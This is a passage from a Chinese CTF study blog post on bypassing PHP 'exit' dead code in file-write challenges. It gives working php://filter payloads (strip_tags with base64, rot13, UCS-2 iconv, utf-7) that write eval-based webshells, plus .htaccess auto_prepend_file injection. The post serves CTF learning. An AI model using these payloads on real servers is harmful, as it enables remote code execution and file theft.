+<p>利用php伪协议filter进行嵌套过滤器进行消除死亡代码，然后进行shell的写入或者读取；不过这种因为是一个变量，所以其限制代码为<code>&lt;?php exit()</code>;  然而我们之前说到的是因为是控制两个变量，在这种情况之下就为<code>&lt;?php exit();?&gt;</code>,两者有本质的区别，然而第一种情况下，后面的几种解法，其实从某种程度上来说，也是将其看成了一个变量从而的出的payload；</p>
+<p>这里题目环境如果在php7下，wmctf的wp上已经写的很清楚了，有多种方法可以绕过去；这里不再过多的解释；</p>
+<p>但是这里想要分享的一个另类的方法，如果题目环境不是在php7下，并且过滤了zlib的话，又该如何去解答，再使用过滤器去压缩和解压就不太可能实现了；这里提供一种我新实验成的方法，利用.htaccess进行预包含，然后读取flag；</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content=php://<span class="built_in">filter</span>/<span class="built_in">write</span>=<span class="keyword">string</span>.strip_tags/<span class="meta">?&gt;</span>php_value%<span class="number">20</span>auto_prepend_file%<span class="number">20</span>G:\s1mple.php%<span class="number">0</span><span class="keyword">a</span>%<span class="number">23</span>/resource=.htaccess</span><br></pre></td></tr></table></figure>
+
+<p>这里可以直接自定义预包含文件，进行测试；结果如下；</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPHRCF.png" alt="img"></p>
+<p>再次访问页面即可包含flag文件，进行读取<img src="https://s1.ax1x.com/2020/08/14/dPHXgH.png" alt="img"></p>
+<p><strong>Base64</strong></p>
+<p>看到这种情况其实也可以想到base64利用，payload：：</p>
+<p><code>php://filter/convert.base64-decode/PD9waHAgcGhwaW5mbygpOz8+/resource=s1mple.php</code>或者</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">php</span>://filter/convert.base<span class="number">64</span>-decode/resource=PD<span class="number">9</span>waHAgcGhwaW<span class="number">5</span>mbygpOz<span class="number">8</span>+.php</span><br></pre></td></tr></table></figure>
+
+<p>看起来顺理成章，进行拼接之后就是<code>&lt;?php exit();php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</code>然后会对其进行一次整体的base64-decode。从而分解掉死亡代码，但是有个小问题，当时我也有点不解，一直无法生成content；虽然文件创建成功，但是就是无法生成content。翻了翻cyc1e师傅的文章，和其他文章 ，发现问题在于‘=’；</p>
+<p>都知道‘=’在base64中的作用是填充，也就是以为着结束；在‘=’的后面是不允许有任何其他字符的否则会报错，有的解码程序会自动忽略后面的字符从而正常解码，其实实际上还是有问题的。如下图所示；</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPHW34.png" alt="img"></p>
+<p>这里因为是由于‘=’从而使得我们写入content不成功，那么我们可以想个方法去掉等号即可，</p>
+<p><strong>去掉等号之过滤器嵌套base64</strong></p>
+<p>payload：  <code>php://filter/string.strip.tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php</code>如此payload我们测试看看载荷效果；</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPL0jH.png" alt="img"></p>
+<p>发现可以生成文件，并且可以看到我们已经成功写入了shell；但是文件名确实有问题，当我们在浏览器访问的时候，会出现访问不到的问题，这里是因为引号的问题；那么如何避免，我们可以使用伪目录的方法，进行变相的绕过去；</p>
+<p>改payload为此：<code>php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code>我们将前面的一串base64字符和闭合的符号整体看作一个目录，虽然没有，但是我们后面重新撤回了原目录，生成s1mple.php文件；从而就可以生成正常的文件名；载荷效果如下：</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPLDud.png" alt="img"></p>
+<p><strong>去掉等号之直接对内容进行变性另类base64</strong></p>
+<p>其实这种也是借助于过滤器，但是原理并不是和之前的原理一样，之前的原理即是：闭合原本的死亡代码，然后在进行过滤器过滤掉内容中的html标签，从而对剩下的内容进行base64解码。但是这种方法却不是如此，payload如下：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">php</span>://filter/&lt;?|string.strip_tags|convert.base<span class="number">64</span>-decode/resource=?&gt;PD<span class="number">9</span>waHAgcGhwaW<span class="number">5</span>mbygpOz<span class="number">8</span>%<span class="number">2</span>B/../s<span class="number">1</span>mple.php</span><br></pre></td></tr></table></figure>
+
+<p>这种方法也是新奇，在一片文章中发现，但是他的payload无法进行攻击成功，我借助其思路重新构造了一个新的payload；这种payload的攻击原理即是首先直接在内容时，就将我们base64遇到的‘=’这个问题直接写在<code>&lt;? ?&gt;</code>中进行过滤掉，然后base64-decode再对原本内容的<code>&lt;?php exit();</code>进行转码，从而达到分解死亡代码的效果；这是两种攻击思路；</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPLFXj.png" alt="img"></p>
+<p><strong>rot13</strong></p>
+<p>尽管base64比较特别，但是并不是所有的编码都受限于‘=’，这里可以采用rot13编码即可；</p>
+<p><code>php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=s1mple.php</code>这里<code>&lt;?php phpinfo();?&gt;</code>的rot13编码即为<code>&lt;?cuc cucvasb();?&gt;</code>,所以这里可以进行写入；载荷效果如下：</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPH5uR.png" alt="img"></p>
+<p>其原理就是利用转码从而将原本的死亡代码进行转码从而使引擎无法识别从而避免死亡代码；</p>
+<h3 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv."></a><strong>convert.iconv.</strong></h3><p>这个过滤器需要 php 支持 <code>iconv</code>，而 iconv 是默认编译的。使用convert.iconv.*过滤器等同于用<code>iconv()</code>函数处理所有的流数据。 然而 我们可以留意到 <code>iconv — 字符串按要求的字符编码来转换</code>;;其用法：<code>iconv ( string $in_charset , string $out_charset , string $str ) : string</code>   将字符串 <code>str</code> 从 <code>in_charset</code> 转换编码到 <code>out_charset</code>。 就其功能而论，有点类似于<code>base_convert</code>的功效一样，只不过二者还是有作用的区别，只是都是涉及编码转换的问题而已；（可以类比）；由此记得国赛的一道love_math的题目，有了base_convert之后就可以尽情的转换从而getshell；</p>
+<p>那么我们就可以借用此过滤器，从而进行编码的转换，写入我们需要的代码，然后转换掉死亡代码，其实本质上来说也是利用了编码的转换；</p>
+<h3 id="1-usc-2"><a href="#1-usc-2" class="headerlink" title="1.usc-2"></a><strong>1.usc-2</strong></h3><p>通过usc-2的编码进行转换；对目标字符串进行2位一反转；（因为是两位一反转，所以字符的数目需要保持在偶数位上）</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPHID1.png" alt="img"></p>
+<p>payload：<code>php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSs[m1lp]e;)&gt;?/resource=s1mple.php</code>;其实也是变向的转换回来，从而利用那一次转换对死亡代码进行扰乱；载荷效果</p>
+<h3 id="2-usc-4"><a href="#2-usc-4" class="headerlink" title="2.usc-4"></a><strong>2.usc-4</strong></h3><p>活用convert.iconv。可以进行usc-4编码转化；就是4位一反转；类比可知，构造的shell代码应该是usc-4中的4倍数；</p>
+<h3 id="3-utf-8与utf-7之间的转化"><a href="#3-utf-8与utf-7之间的转化" class="headerlink" title="3.utf-8与utf-7之间的转化"></a>3.utf-8与utf-7之间的转化</h3><p>经过测试发现如下的现象：</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPHb4O.png" alt="img"><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPLfgg.png" alt="img"></p>
+<p>这里发现生成的是<code>+AD0-</code>,然而经过检测，此字符串可以被base64进行解码；那也就意味着我们可以使用这种方法避免等号对我们base64解码的影响；我们可以直接写入base64加密后的payload，然后将其进行utf之间的转换，因为纯字符转换之后还是其本身；所以其不受影响，进而我们的base64-encode之后的编码依然是存在的，然后进行base64-decode一下，写入shell；算上是一种组合拳；</p>
+<p><code>php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=s1mple.php</code> 载荷效果如下：</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPzFjU.png" alt="img"><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPzAuF.png" alt="img"></p>
+<h3 id="第三种情况"><a href="#第三种情况" class="headerlink" title="第三种情况"></a><strong>第三种情况</strong></h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file<span class="constructor">_put_contents($<span class="params">filename</span>,$<span class="params">content</span> . <span class="string">&quot;\nxxxxxx&quot;</span>)</span>;</span><br></pre></td></tr></table></figure>
+
+<p>面对此情况相对来说要比之前的两种还要在某种程度上来说要简单一点，我们只需要让后面的杂糅代码注释掉，或者分解掉都是可以的，目的就是不让杂糅代码干扰；</p>
+<p>这种情形一般考点都是禁止有特殊起始符和结束符号的语言，举个例子，如果题目没有ban掉php，那么我们可以轻而易举的写入php代码，因为php代码有特殊的起始符和结束符，所以后面的杂糅代码，并不会对其产生什么影响</p>
+<p>所以这类问题的考点，往往在于我们没有办法去写入这类的有特殊起始符和结束符号的语言，往往是需要想办法处理掉杂糅代码的；常见的考点是利用.htaccess进行操作；都知道，.htaccess文件对其文件内容的格式很敏感，如果有杂糅的字符，就会出现错误，导致我们无法进行操作，所以这里我们必须采用注释符将杂糅的代码进行注释，然后才可以正常访问；</p>
+<p>这里对于换行符我们直接进行 <code>\</code> 注释即可。然后再嵌入#注释符，从而达到单行注释就可以将杂糅代码注释掉的效果；载荷效果如下</p>
+<p><a target="_blank" rel="noopener" href="https://s1.ax1x.com/2020/08/14/dPHxKA.png"><img src="https://s1.ax1x.com/2020/08/14/dPHxKA.png" alt="img"></a></p>
+<p>可以发现直接利用，对于这种没有unlink的题目，我们也是可以反复写入.htaccess进行覆盖的，但是前提是我们写入的.htaccess文件格式不能出现错误，如果出现错误，则会触发报错，题目就会锁死。所以对待此类问题应当小心谨慎；回到刚才，我们可以反复的写入，那么我们就可以方法很多</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/STUDY/" rel="tag"># STUDY</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/02/22/Git/" rel="prev" title="Git">
+                  <i class="fa fa-chevron-left"></i> Git
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/" rel="next" title="CTF命令执行总结">
+                  CTF命令执行总结 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">CJ</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="Symbols count total">492k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">7:28</span>
+  </span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
